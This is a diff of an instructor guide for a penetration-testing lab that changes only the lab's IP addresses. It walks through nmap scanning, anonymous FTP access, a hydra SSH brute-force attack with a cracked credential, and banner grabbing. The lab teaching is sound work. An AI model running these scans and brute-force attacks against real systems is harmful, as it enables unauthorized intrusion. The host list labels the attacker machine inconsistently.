@@ -18,29 +18,29 @@ nmap -sn 10.10.8.0/24
 
 **Expected Output:**
 ```
-Nmap scan report for 172.20.0.1
+Nmap scan report for 10.10.8.1
 Host is up (0.000011s latency).
-Nmap scan report for 172.20.0.2 (attacker)
+Nmap scan report for 10.10.8.2 (attacker)
 Host is up (0.000011s latency).
-Nmap scan report for 172.20.0.3
+Nmap scan report for 10.10.8.10
 Host is up (0.000011s latency).
-Nmap scan report for 172.20.0.4  
+Nmap scan report for 10.10.8.11  
 Host is up (0.000011s latency).
-Nmap scan report for 172.20.0.5
+Nmap scan report for 10.10.8.12
 Host is up (0.000011s latency).
-Nmap scan report for 172.20.0.6
+Nmap scan report for 10.10.8.13
 Host is up (0.000011s latency).
-Nmap scan report for 172.20.0.7
+Nmap scan report for 10.10.8.14
 Host is up (0.000011s latency).
 ```
 
 **Target IPs Discovered:**
-- 172.20.0.2 - SMTP server (MailHog)
-- 172.20.0.3 - SSH server  
-- 172.20.0.4 - FTP server
-- 172.20.0.5 - Web server
-- 172.20.0.6 - Mail server (Dovecot POP3/IMAP)
-- 172.20.0.7 - Attacker machine (Kali)
+- 10.10.8.2 - SMTP server (MailHog)
+- 10.10.8.10 - SSH server  
+- 10.10.8.11 - FTP server
+- 10.10.8.12 - Web server
+- 10.10.8.13 - Mail server (Dovecot POP3/IMAP)
+- 10.10.8.14 - Attacker machine (Kali)
 
 ## Phase 1: Reconnaissance (Expected Student Results)
 
@@ -50,19 +50,19 @@ Host is up (0.000011s latency).
 nmap -sn 10.10.8.0/24
 
 # Step 2: Port scan discovered targets
-nmap -sC -sV 172.20.0.2 172.20.0.3 172.20.0.4 172.20.0.5 172.20.0.6
+nmap -sC -sV 10.10.8.2 10.10.8.10 10.10.8.11 10.10.8.12 10.10.8.13
 ```
 
 **Expected Ports Discovered:**
-- 172.20.0.2: 1025/tcp (SMTP - MailHog), 8025/tcp (HTTP - MailHog Web UI)
-- 172.20.0.3: 22/tcp (SSH - OpenSSH)
-- 172.20.0.4: 21/tcp (FTP - vsftpd)
-- 172.20.0.5: 80/tcp (HTTP - Apache)
-- 172.20.0.6: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)
+- 10.10.8.2: 1025/tcp (SMTP - MailHog), 8025/tcp (HTTP - MailHog Web UI)
+- 10.10.8.10: 22/tcp (SSH - OpenSSH)
+- 10.10.8.11: 21/tcp (FTP - vsftpd)
+- 10.10.8.12: 80/tcp (HTTP - Apache)
+- 10.10.8.13: 110/tcp (POP3 - Dovecot), 143/tcp (IMAP - Dovecot)
 
 ### Web Enumeration
 ```bash
-curl http://172.20.0.5
+curl http://10.10.8.12
 ```
 
 **Expected Findings:**
@@ -77,7 +77,7 @@ Students should extract these employee names and emails:
 
 ### FTP Service Investigation
 ```bash
-ftp 172.20.0.4
+ftp 10.10.8.11
 # Username: anonymous
 # Password: (just press Enter)
 
@@ -93,7 +93,7 @@ ftp> quit
 
 ### SSH Service Banner
 ```bash
-ssh 172.20.0.3
+ssh 10.10.8.10
 ```
 
 **Expected Banner:** OpenSSH server accepting password authentication
@@ -140,19 +140,19 @@ letmein
 EOF
 
 # Alternative: For comprehensive attack, use rockyou.txt
-# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
+# hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.8.10 ssh -t 4
 ```
 
 ### SSH Brute Force Attack
 
 **Educational Brute Force Attack:**
 ```bash
-hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
+hydra -L users.txt -P passwords.txt 10.10.8.10 ssh -t 4
 ```
 
 **Expected Successful Credential:**
 ```
-[22][ssh] host: 172.20.0.3   login: aadams   password: smadaa
+[22][ssh] host: 10.10.8.10   login: aadams   password: smadaa
 ```
 
 **Teaching Points for Discussion:**
@@ -177,7 +177,7 @@ hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
    For comprehensive attacks, use:
    ```bash
    # Standard comprehensive wordlist
-   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 172.20.0.3 ssh -t 4
+   hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.8.10 ssh -t 4
    
    # Custom wordlist from OSINT research
    # Create passwords.txt from gathered intelligence
@@ -188,7 +188,7 @@ hydra -L users.txt -P passwords.txt 172.20.0.3 ssh -t 4
 
 ### SSH Access and Exploration
 ```bash
-ssh aadams@172.20.0.3
+ssh aadams@10.10.8.10
 # Password: smadaa
 
 # Once inside:
@@ -239,16 +239,16 @@ Students should notice that `smadaa` is `aadams` reversed, suggesting:
 ### Additional Service Enumeration
 ```bash
 # SMTP Banner
-telnet 172.20.0.2 1025
+telnet 10.10.8.2 1025
 # Type: EHLO test
 # Expected: MailHog SMTP server response
 
 # POP3 Banner  
-telnet 172.20.0.6 110
+telnet 10.10.8.13 110
 # Expected: Dovecot POP3 server ready
 
 # IMAP Banner
-telnet 172.20.0.6 143  
+telnet 10.10.8.13 143  
 # Expected: Dovecot IMAP server ready
 ```
 
